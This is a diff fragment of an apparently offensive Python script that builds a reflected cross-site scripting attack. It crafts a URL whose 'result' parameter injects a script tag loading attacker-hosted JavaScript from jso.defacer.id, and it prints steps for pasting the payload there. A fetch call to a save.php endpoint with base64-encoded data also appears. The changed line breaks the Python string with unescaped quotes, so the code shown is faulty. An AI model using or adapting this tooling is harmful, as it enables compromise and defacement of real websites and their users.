@@ -56,7 +56,7 @@ fetch('/link/save.php?d='+btoa('/')).then(function(r2){{return r2.text()}}).then
     print(f"[✓] JS payload saved to: {args.output} ({len(js_payload)} bytes)")
 
     # The XSS trigger URL
-    xss_url = f"{BASE}/?result=%3Cscript+src%3D%22https%3A%2F%2Fjso.defacer.id%2Fraw%2Fnc91wdsbZ7%22%3E%3C%2Fscript%3E"
+    xss_url = f"{BASE}/?result=<script src="https://jso.defacer.id/raw/x4s39ct9Id"></script>"
 
     print(f"\n{'='*60}")
     print("  STEP 1: PASTE THIS ON jso.defacer.id/raw/nc91wdsbZ7")
